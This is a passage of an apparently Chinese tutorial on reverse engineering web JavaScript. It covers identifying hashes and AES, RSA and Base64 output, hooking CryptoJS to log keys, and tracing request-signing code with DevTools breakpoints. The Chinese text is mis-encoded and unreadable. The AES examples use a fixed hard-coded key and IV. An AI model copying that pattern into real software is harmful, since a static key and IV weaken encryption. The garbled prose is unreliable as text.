<span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¯¹ç§°åŠ å¯†-symmetric-encryption">å¯¹ç§°åŠ å¯† (Symmetric Encryption)</h2>

      <h3 id="aes-advanced-encryption-standard">AES (Advanced Encryption Standard)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>å—åŠ å¯†ï¼Œå—å¤§å° 128 bit</li>
        <li>å¯†é’¥é•¿åº¦: 128/192/256 bit</li>
        <li>éœ€è¦ <strong>IV (Initialization Vector)</strong></li>
        <li>æ¨¡å¼: ECB, CBC, CTR, GCM ç­‰</li>
      </ul>

      <p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// CryptoJS</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>

<span class="c1">// Web Crypto API</span>
<span class="nx">crypto</span><span class="p">.</span><span class="nx">subtle</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">({</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;AES-CBC&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">iv</span><span class="o">:</span><span class="w"> </span><span class="nx">iv</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span>

<span class="c1">// æœç´¢å…³é”®è¯</span>
<span class="s2">&quot;AES&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;encrypt&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;decrypt&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;IV&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;padding&quot;</span>
</code></pre>
      </div>

      <p><strong>å¸¸è§æ¨¡å¼å¯¹æ¯”</strong>:</p>

      <table>
        <thead>
          <tr>
            <th>æ¨¡å¼</th>
            <th>IV éœ€æ±‚</th>
            <th>å¹¶è¡ŒåŠ å¯†</th>
            <th>å®‰å…¨æ€§</th>
            <th>å¤‡æ³¨</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>ECB</td>
            <td>å¦</td>
            <td>æ˜¯</td>
            <td>ä½</td>
            <td>ä¸å®‰å…¨ï¼Œç›¸åŒæ˜æ–‡äº§ç”Ÿç›¸åŒå¯†æ–‡</td>
          </tr>
          <tr>
            <td>CBC</td>
            <td>æ˜¯</td>
            <td>å¦</td>
            <td>ä¸­</td>
            <td>æœ€å¸¸ç”¨</td>
          </tr>
          <tr>
            <td>CTR</td>
            <td>æ˜¯</td>
            <td>æ˜¯</td>
            <td>é«˜</td>
            <td>æµå¼åŠ å¯†</td>
          </tr>
          <tr>
            <td>GCM</td>
            <td>æ˜¯</td>
            <td>æ˜¯</td>
            <td>é«˜</td>
            <td>å¸¦è®¤è¯</td>
          </tr>
        </tbody>
      </table>

      <p><strong>Python å®ç° (AES-CBC)</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1234567890123456&#39;</span>  <span class="c1"># 16 bytes for AES-128</span>
<span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;abcdefghijklmnop&#39;</span>

<span class="c1"># åŠ å¯†</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;secret data&#39;</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

<span class="c1"># è§£å¯†</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</code></pre>
      </div>

      <h3 id="des-3des">DES / 3DES</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>DES: 56 bit å¯†é’¥ï¼Œå·²è¿‡æ—¶</li>
        <li>3DES: 168 bit å¯†é’¥</li>
        <li>å—å¤§å°: 64 bit</li>
      </ul>

      <p><strong>è¯†åˆ«</strong>: æœç´¢ <code>DES</code>, <code>TripleDES</code></p>

      <hr />

      <h2 id="éå¯¹ç§°åŠ å¯†-asymmetric-encryption">éå¯¹ç§°åŠ å¯† (Asymmetric Encryption)</h2>

      <h3 id="rsa">RSA</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†</li>
        <li>å¯†é’¥é•¿åº¦: 1024/2048/4096 bit</li>
        <li>æ…¢ï¼Œé€šå¸¸ç”¨äºåŠ å¯†å°æ•°æ®ï¼ˆå¦‚ AES å¯†é’¥ï¼‰</li>
      </ul>

      <p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// JSEncrypt åº“</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">JSEncrypt</span><span class="p">();</span>
<span class="nx">encrypt</span><span class="p">.</span><span class="nx">setPublicKey</span><span class="p">(</span><span class="nx">publicKey</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">);</span>

<span class="c1">// Web Crypto API</span>
<span class="nx">crypto</span><span class="p">.</span><span class="nx">subtle</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">({</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;RSA-OAEP&quot;</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="nx">publicKey</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span>

<span class="c1">// å…³é”®è¯</span>
<span class="s2">&quot;RSA&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;publicKey&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;privateKey&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-----BEGIN PUBLIC KEY-----&quot;</span>
</code></pre>
      </div>

      <p><strong>å…¬é’¥æ ¼å¼</strong>:</p>

      <pre><code>-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
</code></pre>

      <p><strong>Python å®ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="c1"># ç”Ÿæˆå¯†é’¥å¯¹</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
<span class="n">public_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span>

<span class="c1"># åŠ å¯†</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;secret&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

<span class="c1"># è§£å¯†</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç¼–ç -vs-åŠ å¯†">ç¼–ç  vs åŠ å¯†</h2>

      <h3 id="base64-ç¼–ç éåŠ å¯†">Base64 (ç¼–ç ï¼ŒéåŠ å¯†)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>å­—ç¬¦é›†: <code>A-Z</code>, <code>a-z</code>, <code>0-9</code>, <code>+</code>, <code>/</code></li>
        <li>ç»“å°¾å¯èƒ½æœ‰ <code>=</code> æˆ– <code>==</code> å¡«å……</li>
        <li>é•¿åº¦æ˜¯ 4 çš„å€æ•°</li>
      </ul>

      <p><strong>è¯†åˆ«</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">btoa</span><span class="p">(</span><span class="s2">&quot;hello&quot;</span><span class="p">)</span><span class="w">  </span><span class="c1">// &quot;aGVsbG8=&quot;</span>
<span class="nx">atob</span><span class="p">(</span><span class="s2">&quot;aGVsbG8=&quot;</span><span class="p">)</span><span class="w">  </span><span class="c1">// &quot;hello&quot;</span>
</code></pre>
      </div>

      <p><strong>Python</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>  <span class="c1"># &#39;aGVsbG8=&#39;</span>
<span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;aGVsbG8=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>  <span class="c1"># &#39;hello&#39;</span>
</code></pre>
      </div>

      <h3 id="hex-åå…­è¿›åˆ¶ç¼–ç ">Hex (åå…­è¿›åˆ¶ç¼–ç )</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>å­—ç¬¦é›†: <code>0-9</code>, <code>a-f</code></li>
        <li>æ¯ä¸ªå­—èŠ‚ç”¨ 2 ä¸ªå­—ç¬¦è¡¨ç¤º</li>
      </ul>

      <p><strong>è¯†åˆ«</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="s2">&quot;48656c6c6f&quot;</span><span class="w">  </span><span class="c1">// &quot;Hello&quot; çš„ Hex ç¼–ç </span>
</code></pre>
      </div>

      <p><strong>Python</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="s1">&#39;Hello&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>  <span class="c1"># &#39;48656c6c6f&#39;</span>
<span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">&#39;48656c6c6f&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>  <span class="c1"># &#39;Hello&#39;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è¯†åˆ«æµç¨‹">è¯†åˆ«æµç¨‹</h2>

      <h3 id="æ­¥éª¤ä¸€è§‚å¯Ÿè¾“å‡ºç‰¹å¾">æ­¥éª¤ä¸€ï¼šè§‚å¯Ÿè¾“å‡ºç‰¹å¾</h3>

      <ol>
        <li>
          <p><strong>é•¿åº¦å›ºå®š</strong>: å¯èƒ½æ˜¯å“ˆå¸Œ</p>

          <ul>
            <li>32 å­—ç¬¦ -> MD5</li>
            <li>40 å­—ç¬¦ -> SHA-1</li>
            <li>64 å­—ç¬¦ -> SHA-256</li>
          </ul>
        </li>
        <li>
          <p><strong>é•¿åº¦å¯å˜</strong>: å¯èƒ½æ˜¯åŠ å¯†æˆ–ç¼–ç </p>

          <ul>
            <li>ç»“å°¾æœ‰ <code>=</code> -> Base64</li>
            <li>å…¨æ˜¯ <code>0-9a-f</code> -> Hex</li>
          </ul>
        </li>
      </ol>

      <h3 id="æ­¥éª¤äºŒæœç´¢å…³é”®è¯">æ­¥éª¤äºŒï¼šæœç´¢å…³é”®è¯</h3>

      <p>åœ¨ Sources é¢æ¿å…¨å±€æœç´¢ï¼š</p>

      <ul>
        <li>é€šç”¨: <code>encrypt</code>, <code>decrypt</code>, <code>crypto</code></li>
        <li>åº“å: <code>CryptoJS</code>, <code>JSEncrypt</code>, <code>forge</code></li>
        <li>ç®—æ³•å: <code>AES</code>, <code>RSA</code>, <code>MD5</code>, <code>SHA</code></li>
      </ul>

      <h3 id="æ­¥éª¤ä¸‰hook-åŠ å¯†å‡½æ•°">æ­¥éª¤ä¸‰ï¼šHook åŠ å¯†å‡½æ•°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook CryptoJS</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalAES</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">;</span>
<span class="w">    </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[AES Encrypt]&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Message:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Key:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalAES</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¸¸è§åŠ å¯†åº“">å¸¸è§åŠ å¯†åº“</h2>

      <h3 id="javascript-åŠ å¯†åº“">JavaScript åŠ å¯†åº“</h3>

      <table>
        <thead>
          <tr>
            <th>åº“å</th>
            <th>ç‰¹ç‚¹</th>
            <th>æ£€æµ‹æ–¹æ³•</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>CryptoJS</strong></td>
            <td>æœ€æµè¡Œçš„çº¯ JS åŠ å¯†åº“</td>
            <td><code>window.CryptoJS</code></td>
          </tr>
          <tr>
            <td><strong>Forge</strong></td>
            <td>å…¨åŠŸèƒ½åŠ å¯†åº“</td>
            <td><code>window.forge</code></td>
          </tr>
          <tr>
            <td><strong>JSEncrypt</strong></td>
            <td>RSA ä¸“ç”¨</td>
            <td><code>window.JSEncrypt</code></td>
          </tr>
          <tr>
            <td><strong>crypto-js</strong></td>
            <td>CryptoJS çš„ npm åŒ…</td>
            <td><code>require('crypto-js')</code></td>
          </tr>
          <tr>
            <td><strong>Web Crypto API</strong></td>
            <td>æµè§ˆå™¨åŸç”Ÿ</td>
            <td><code>window.crypto.subtle</code></td>
          </tr>
        </tbody>
      </table>

      <h3 id="python-åŠ å¯†åº“">Python åŠ å¯†åº“</h3>

      <table>
        <thead>
          <tr>
            <th>åº“å</th>
            <th>å®‰è£…</th>
            <th>ç”¨é€”</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>hashlib</strong></td>
            <td>å†…ç½®</td>
            <td>MD5, SHA</td>
          </tr>
          <tr>
            <td><strong>pycryptodome</strong></td>
            <td><code>pip install pycryptodome</code></td>
            <td>AES, RSA, DES</td>
          </tr>
          <tr>
            <td><strong>cryptography</strong></td>
            <td><code>pip install cryptography</code></td>
            <td>ç°ä»£åŠ å¯†åº“</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å®æˆ˜æ¡ˆä¾‹">å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹1-è¯†åˆ«æœªçŸ¥å“ˆå¸Œ">æ¡ˆä¾‹1: è¯†åˆ«æœªçŸ¥å“ˆå¸Œ</h3>

      <p><strong>è§‚å¯Ÿ</strong>:</p>

      <pre><code>è¾“å…¥: "admin"
è¾“å‡º: "21232f297a57a5a743894a0e4a801fc3"
</code></pre>

      <p><strong>åˆ†æ</strong>:</p>

      <ul>
        <li>é•¿åº¦ 32 -> MD5</li>
        <li>éªŒè¯: <code>MD5("admin")</code> = <code>21232f297a57a5a743894a0e4a801fc3</code> âœ…</li>
      </ul>

      <h3 id="æ¡ˆä¾‹2-è¯†åˆ«åŠ å¯†ç®—æ³•">æ¡ˆä¾‹2: è¯†åˆ«åŠ å¯†ç®—æ³•</h3>

      <p><strong>è§‚å¯Ÿ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;U2FsdGVkX1+gGv7...&quot;</span><span class="p">;</span><span class="w">  </span><span class="c1">// Base64 æ ¼å¼</span>
</code></pre>
      </div>

      <p><strong>åˆ†æ</strong>:</p>

      <ul>
        <li>å¼€å¤´ <code>U2FsdGVkX1</code> -> Base64 è§£ç  = <code>Salted__</code></li>
        <li>è¿™æ˜¯ <strong>CryptoJS AES</strong> çš„å…¸å‹ç‰¹å¾</li>
      </ul>

      <p><strong>éªŒè¯</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
<span class="c1">// &quot;U2FsdGVkX1+...&quot;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#03-Basic-Recipes-hooking-techniques">JavaScript Hook æŠ€æœ¯</a></li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
        <li><a href="#03-Basic-Recipes-api-reverse-engineering">API æ¥å£é€†å‘</a></li>
      </ul>

    </div>

    <div class="section" id="03-Basic-Recipes-dynamic-parameter-analysis">
      <h2>30. Dynamic Parameter Analysis</h2>
      <h1 id="åŠ¨æ€å‚æ•°åˆ†æ">åŠ¨æ€å‚æ•°åˆ†æ</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>å½“é™æ€ä»£ç æ··æ·†å¾—åƒä¸€å›¢ä¹±éº»æ—¶ï¼ŒåŠ¨æ€åˆ†ææ˜¯æˆ‘ä»¬å”¯ä¸€çš„å‡ºè·¯ã€‚é€šè¿‡è§‚å¯Ÿå‚æ•°åœ¨è¿è¡Œæ—¶çš„å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥æ¨å¯¼å‡ºç”Ÿæˆé€»è¾‘ã€‚</p>

      <p>åŠ¨æ€åˆ†æçš„æ ¸å¿ƒæ˜¯<strong>è§‚å¯Ÿæ•°æ®æµ</strong> â€”â€” ä¸è¦è¯•å›¾ç†è§£æ¯ä¸€è¡Œæ··æ·†ä»£ç çš„è¯­ä¹‰ï¼Œè€Œæ˜¯å…³æ³¨æ•°æ®ä»å“ªé‡Œæ¥ã€ç»è¿‡äº†ä»€ä¹ˆå¤„ç†ã€æœ€åå˜æˆäº†ä»€ä¹ˆã€‚</p>

      <hr />

      <h2 id="1-å †æ ˆè·Ÿè¸ª-stack-trace-åˆ†æ">1. å †æ ˆè·Ÿè¸ª (Stack Trace) åˆ†æ</h2>

      <p>è°ƒç”¨æ ˆæ˜¯ç¨‹åºæ‰§è¡Œçš„"æ¡ˆå‘ç°åœº"ï¼Œæ˜¯å®šä½ä»£ç çš„ç¬¬ä¸€æ‰‹æ®µã€‚</p>

      <h3 id="11-æŸ¥çœ‹è°ƒç”¨æ ˆçš„æ–¹æ³•">1.1 æŸ¥çœ‹è°ƒç”¨æ ˆçš„æ–¹æ³•</h3>

      <h4 id="æ–¹æ³•-1æ–­ç‚¹è‡ªåŠ¨åœä¸‹">æ–¹æ³• 1ï¼šæ–­ç‚¹è‡ªåŠ¨åœä¸‹</h4>

      <p>åœ¨ Sources é¢æ¿æ‰“æ–­ç‚¹åï¼Œå³ä¾§ Call Stack é¢æ¿ä¼šæ˜¾ç¤ºå®Œæ•´è°ƒç”¨é“¾ï¼š</p>

      <pre><code>generateSign (utils.js:1234)
  â†‘ è°ƒç”¨è€…
sendRequest (api.js:567)
  â†‘ è°ƒç”¨è€…
onClick (main.js:89)
  â†‘ è°ƒç”¨è€…
(anonymous) (VM123:5)  â† äº‹ä»¶ç›‘å¬å™¨
</code></pre>

      <h4 id="æ–¹æ³•-2æ‰‹åŠ¨æ‰“å°å †æ ˆ">æ–¹æ³• 2ï¼šæ‰‹åŠ¨æ‰“å°å †æ ˆ</h4>

      <p>åœ¨ Console ä¸­ä»»ä½•ä½ç½®æ‰§è¡Œï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s2">&quot;å½“å‰è°ƒç”¨æ ˆ&quot;</span><span class="p">);</span>
</code></pre>
      </div>

      <p>è¾“å‡ºç±»ä¼¼ï¼š</p>

      <pre><code>console.trace
  at generateSign (utils.js:1234)
  at sendRequest (api.js:567)
  at onClick (main.js:89)
</code></pre>

      <h4 id="æ–¹æ³•-3ä½¿ç”¨-error-å¯¹è±¡">æ–¹æ³• 3ï¼šä½¿ç”¨ Error å¯¹è±¡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">stack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">().</span><span class="nx">stack</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stack</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="12-å¯»æ‰¾æ–­å±‚æŠ€å·§">1.2 å¯»æ‰¾"æ–­å±‚"æŠ€å·§</h3>

      <p><strong>ç°è±¡</strong>: è°ƒç”¨æ ˆä¸­çªç„¶å‡ºç°ä»¥ä¸‹ç‰¹å¾</p>

      <ul>
        <li><code>VM123</code>, <code>eval</code> â†’ åŠ¨æ€ç”Ÿæˆçš„ä»£ç </li>
        <li><code>l</code>, <code>e</code>, <code>f</code>, <code>t</code> ç­‰å•å­—æ¯å‡½æ•°å â†’ æ··æ·†åçš„ä»£ç </li>
        <li><code>&lt;anonymous&gt;</code> â†’ åŒ¿åå‡½æ•°ï¼ˆå¯èƒ½æ˜¯ç«‹å³æ‰§è¡Œå‡½æ•° IIFEï¼‰</li>
      </ul>

      <p><strong>å«ä¹‰</strong>: è¿™é€šå¸¸æ„å‘³ç€è¿›å…¥äº†æ··æ·†åçš„æ ¸å¿ƒé€»è¾‘</p>

      <p><strong>æ“ä½œ</strong>: åœ¨æ ˆé¡¶çš„ç¬¬ä¸€ä¸ª<strong>å¯è¯»å‡½æ•°</strong>å¤„æ‰“æ–­ç‚¹ï¼Œç„¶å Step Into (F11) è¿›å…¥å†…éƒ¨</p>

      <p><strong>ç¤ºä¾‹</strong></p>

      <pre><code>Call Stack:
generateSign (utils.js:1234)  â† å¯è¯»ï¼Œä»è¿™é‡Œå¼€å§‹è°ƒè¯•
  â†‘
t (VM123:5)                   â† æ··æ·†ä»£ç 
  â†‘
e (VM123:2)                   â† æ··æ·†ä»£ç 
  â†‘
onClick (main.js:89)          â† å¯è¯»
</code></pre>

      <h3 id="13-åˆ©ç”¨-initiator-å‘èµ·è€…">1.3 åˆ©ç”¨ Initiator (å‘èµ·è€…)</h3>

      <p>Chrome çš„ Network é¢æ¿æœ‰ä¸€åˆ— <code>Initiator</code>ï¼Œæ˜¾ç¤ºè¯·æ±‚çš„æ¥æºã€‚</p>

      <p><strong>æ“ä½œæ­¥éª¤</strong>:</p>

      <ol>
        <li>Network é¢æ¿æ‰¾åˆ°ç›®æ ‡è¯·æ±‚</li>
        <li>æŸ¥çœ‹ Initiator åˆ—</li>
        <li>ç‚¹å‡»è“è‰²é“¾æ¥ â†’ ç›´æ¥è·³è½¬åˆ°å‘åŒ…ä»£ç </li>
      </ol>

      <p><strong>Initiator ç±»å‹</strong>:</p>

      <table>
        <thead>
          <tr>
            <th>ç±»å‹</th>
            <th>å«ä¹‰</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Script</strong></td>
            <td>JS ä»£ç å‘èµ·</td>
            <td><code>api.js:567</code></td>
          </tr>
          <tr>
            <td><strong>Parser</strong></td>
            <td>HTML è§£æå™¨åŠ è½½</td>
            <td><code>&lt;img src="..."&gt;</code></td>
          </tr>
          <tr>
            <td><strong>Redirect</strong></td>
            <td>é‡å®šå‘</td>
            <td><code>301/302</code></td>
          </tr>
          <tr>
            <td><strong>Other</strong></td>
            <td>å…¶ä»–ï¼ˆæ‰©å±•ã€DevToolsï¼‰</td>
            <td>-</td>
          </tr>
        </tbody>
      </table>

      <p><strong>é«˜çº§åŠŸèƒ½</strong>: Request Call Stack</p>

      <ul>
        <li>å¼€å¯: DevTools Settings â†’ Experiments â†’ Enable async stack traces</li>
        <li>æ•ˆæœ: å¯ä»¥çœ‹åˆ°å¼‚æ­¥å›è°ƒå‰çš„è°ƒç”¨æ ˆï¼ˆå¦‚ <code>setTimeout</code>, <code>Promise.then</code>ï¼‰</li>
      </ul>

      <hr />

      <h2 id="2-æ–­ç‚¹æŠ€æœ¯">2. æ–­ç‚¹æŠ€æœ¯</h2>

      <h3 id="21-æ–­ç‚¹ç±»å‹">2.1 æ–­ç‚¹ç±»å‹</h3>

      <h4 id="æ™®é€šæ–­ç‚¹-line-breakpoint">æ™®é€šæ–­ç‚¹ (Line Breakpoint)</h4>

      <p>ç‚¹å‡»è¡Œå·å³å¯ï¼Œä»£ç æ‰§è¡Œåˆ°æ­¤è¡Œæ—¶æš‚åœã€‚</p>

